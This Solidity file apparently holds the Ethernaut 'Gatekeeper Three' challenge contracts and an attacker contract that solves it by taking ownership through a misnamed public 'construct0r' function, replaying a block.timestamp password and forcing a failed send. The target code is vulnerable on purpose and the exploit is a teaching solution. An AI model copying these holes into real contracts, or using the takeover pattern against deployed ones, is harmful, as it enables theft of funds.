// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SimpleTrick {
  GatekeeperThree public target;
  address public trick;
  uint private password = block.timestamp;

  constructor (address payable _target) {
    target = GatekeeperThree(_target);
  }
    
  function checkPassword(uint _password) public returns (bool) {
    if (_password == password) {
      return true;
    }
    password = block.timestamp;
    return false;
  }
    
  function trickInit() public {
    trick = address(this);
  }
    
  function trickyTrick() public {
    if (address(this) == msg.sender && address(this) != trick) {
      target.getAllowance(password);
    }
  }
}

contract GatekeeperThree {
  address public owner;
  address public entrant;
  bool public allowEntrance;

  SimpleTrick public trick;

  function construct0r() public {
      owner = msg.sender;
  }

  modifier gateOne() {
    require(msg.sender == owner);
    require(tx.origin != owner);
    _;
  }

  modifier gateTwo() {
    require(allowEntrance == true);
    _;
  }

  modifier gateThree() {
    if (address(this).balance > 0.001 ether && payable(owner).send(0.001 ether) == false) {
      _;
    }
  }

  function getAllowance(uint _password) public {
    if (trick.checkPassword(_password)) {
        allowEntrance = true;
    }
  }

  function createTrick() public {
    trick = new SimpleTrick(payable(address(this)));
    trick.trickInit();
  }

  function enter() public gateOne gateTwo gateThree {
    entrant = tx.origin;
  }

  receive () external payable {}
}


contract Enter {
    error Gate3();

    GatekeeperThree gate = GatekeeperThree(payable(0xb1E7fE864F6D256990d8a15a6315A23aDCAb45d0));

    function enter() public payable {
        // Gate 1: Having a contract inbetween to make sure msg.sender and tx.origin are different
        gate.construct0r();
        // Gate 2: Set password to block.timestamp in trick contract by calling createTrick from gate
        gate.createTrick();
        gate.getAllowance(block.timestamp);
        // Gate 3: add balance to gate contract. When it attempt to send to this contract the receive function will revert
        // payable(gate).send(0.00100001 ether);
        // the send function should revert as no receive function specified in this contract
        address(gate).call{value: msg.value}("");
        gate.enter();
    }
}
